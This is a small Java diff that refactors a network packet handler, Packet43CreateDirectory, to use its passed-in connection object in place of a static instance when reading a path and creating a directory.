@@ -10,12 +10,12 @@ public class Packet43CreateDirectory extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
-		String where = Connection.instance.readLine();
-		String name = Connection.instance.readLine();
+		String where = con.readLine();
+		String name = con.readLine();
 
 		File file = new File(where + File.separator + name);
 		file.mkdirs();
-		Connection.instance.status(Constants.STATUS_MKDIR);
+		con.status(Constants.STATUS_MKDIR);
 	}
 
 }
